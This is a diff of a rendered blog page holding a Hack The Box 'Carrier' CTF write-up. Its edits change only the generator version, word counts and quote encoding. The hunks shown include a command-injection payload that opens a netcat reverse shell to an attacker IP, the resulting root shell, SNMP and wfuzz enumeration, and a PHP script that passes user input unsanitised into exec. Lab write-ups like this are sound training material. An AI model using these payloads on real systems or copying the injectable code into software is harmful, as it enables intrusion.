@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Carrier | text/plain</title>
@@ -284,7 +284,7 @@ root flag is now only one FTP download away. All in all a really interesting
 challenge and a great way to learn more about how the Internet actually works.
 "><meta itemprop="datePublished" content="2019-03-18T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2019-03-18T00:00:00+00:00" />
-<meta itemprop="wordCount" content="5138"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="4948"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up,BGP hijacking," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -294,7 +294,7 @@ challenge and a great way to learn more about how the Internet actually works.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>25 minute read</span>
+<span>24 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -424,19 +424,19 @@ directories. I like <a href="https://github.com/xmendez/wfuzz">wfuzz</a>:</p>
 ID      Response   Lines      Word         Chars          Payload
 ==================================================================
 
-000039:  C=301      9 L       28 W          310 Ch        &quot;img&quot;
-000121:  C=301      9 L       28 W          312 Ch        &quot;tools&quot;
-000222:  C=301      9 L       28 W          310 Ch        &quot;doc&quot;
-000550:  C=301      9 L       28 W          310 Ch        &quot;css&quot;
-000953:  C=301      9 L       28 W          309 Ch        &quot;js&quot;
-002771:  C=301      9 L       28 W          312 Ch        &quot;fonts&quot;
-005711:  C=301      9 L       28 W          312 Ch        &quot;debug&quot;
+000039:  C=301      9 L       28 W          310 Ch        &#34;img&#34;
+000121:  C=301      9 L       28 W          312 Ch        &#34;tools&#34;
+000222:  C=301      9 L       28 W          310 Ch        &#34;doc&#34;
+000550:  C=301      9 L       28 W          310 Ch        &#34;css&#34;
+000953:  C=301      9 L       28 W          309 Ch        &#34;js&#34;
+002771:  C=301      9 L       28 W          312 Ch        &#34;fonts&#34;
+005711:  C=301      9 L       28 W          312 Ch        &#34;debug&#34;
 </code></pre><p>A similar scan can be run to ensure we don&rsquo;t miss interesting files:</p>
 <pre tabindex="0"><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-pdf-php http://10.10.10.105/FUZZ.FUZ2Z
-000045:  C=200     63 L      105 W         1509 Ch        &quot;index - php&quot;
-007071:  C=302      0 L        0 W            0 Ch        &quot;tickets - php&quot;
-008781:  C=302      0 L        0 W            0 Ch        &quot;dashboard - php&quot;
-057168:  C=302      0 L        0 W            0 Ch        &quot;diag - php&quot;
+000045:  C=200     63 L      105 W         1509 Ch        &#34;index - php&#34;
+007071:  C=302      0 L        0 W            0 Ch        &#34;tickets - php&#34;
+008781:  C=302      0 L        0 W            0 Ch        &#34;dashboard - php&#34;
+057168:  C=302      0 L        0 W            0 Ch        &#34;diag - php&#34;
 </code></pre><h2 id="exploring">Exploring</h2>
 <p>With those scans running, we can open a browser and check things out manually.
 The first thing you see is a login page for a &ldquo;Lygthspeed&rdquo; system:</p>
@@ -613,7 +613,7 @@ brute-forcing. Don&rsquo;t make the same mistake.</p>
 to enumerate like so:</p>
 <pre tabindex="0"><code> $ snmpwalk -c public 10.10.10.105 -v 1
 Created directory: /var/lib/snmp/mib_indexes
-SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: &quot;SN#NET_45JDX23&quot;
+SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: &#34;SN#NET_45JDX23&#34;
 End of MIB
 </code></pre><p>Devices usually return myriads of data points but here we get just one. &ldquo;SN#&rdquo;
 sounds a lot like a serial number and indeed, trying &ldquo;admin&rdquo; and &ldquo;NET_45JDX23&rdquo;
@@ -795,7 +795,7 @@ command. It even proves that we are root. Sounds like jackpot.</p>
 </style>
 
 <p>Getting a reverse shell is easy now. Encode a suitable payload:</p>
-<pre tabindex="0"><code> $ echo &quot;;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.122 7001 &gt;/tmp/x&quot; | base64 -w 0
+<pre tabindex="0"><code> $ echo &#34;;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.122 7001 &gt;/tmp/x&#34; | base64 -w 0
 O3JtIC90bXAveDtta2ZpZm8gL3RtcC94O2NhdCAvdG1wL3h8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzMCA3MDAxID4vdG1wL3gK
 </code></pre><p>Now start a listener and use the payload in a new request. You should catch a
 shell:</p>
@@ -805,7 +805,7 @@ Ncat: Listening on :::7001
 Ncat: Listening on 0.0.0.0:7001
 Ncat: Connection from 10.10.10.105.
 Ncat: Connection from 10.10.10.105:51372.
-/bin/sh: 0: can't access tty; job control turned off
+/bin/sh: 0: can&#39;t access tty; job control turned off
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # find / -name user.txt 2&gt;/dev/null
@@ -1354,7 +1354,7 @@ Check out the bonus section of you like.</p>
 <p>The credentials for the FTP server looked a lot like the root credentials
 for this server. There was also an SSH server running, so try logging in:</p>
 <pre tabindex="0"><code>root@r1:/dev/shm/.me# ssh root@10.120.15.10
-root@10.120.15.10's password:
+root@10.120.15.10&#39;s password:
 Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
 ...
 Last login: Sat Mar  9 21:42:33 2019 from 10.120.15.1
@@ -1383,11 +1383,11 @@ This is how we got from the website to the router.</p>
 <pre tabindex="0"><code>root@carrier:/var/lib/lxd/storage-pools/default/containers/web/rootfs/var/www/html# cat diag.php
 ...
 &lt;?php
-$check = base64_decode($_POST[&quot;check&quot;]);
+$check = base64_decode($_POST[&#34;check&#34;]);
 if ($check) {
-    exec(&quot;ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 'ps waux | grep &quot; . $check . &quot; | grep -v grep'&quot;, $output);
+    exec(&#34;ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 &#39;ps waux | grep &#34; . $check . &#34; | grep -v grep&#39;&#34;, $output);
     foreach($output as $line) {
-        echo &quot;&lt;p&gt;&quot; . $line . &quot;&lt;/p&gt;&quot;;
+        echo &#34;&lt;p&gt;&#34; . $line . &#34;&lt;/p&gt;&#34;;
     }
 }
 ?&gt;
@@ -1433,7 +1433,7 @@ from shortest path routing and how policies are designed.</li>
   
     and tagged <a href="/tags/bgp-hijacking/">BGP hijacking</a>, <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
   
-  using <span itemprop="wordCount">5138</span> words.
+  using <span itemprop="wordCount">4948</span> words.
 </p>
 
       
@@ -1444,7 +1444,7 @@ from shortest path routing and how policies are designed.</li>
     <ul>
       
         <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
-        <time datetime="11M">11 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
         <time datetime="12M">12 minutes</time>
@@ -1462,7 +1462,7 @@ from shortest path routing and how policies are designed.</li>
         <time datetime="12M">12 minutes</time>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="10M">10 minutes</time>
+        <time datetime="9M">9 minutes</time>
       
     </ul>
   </aside>
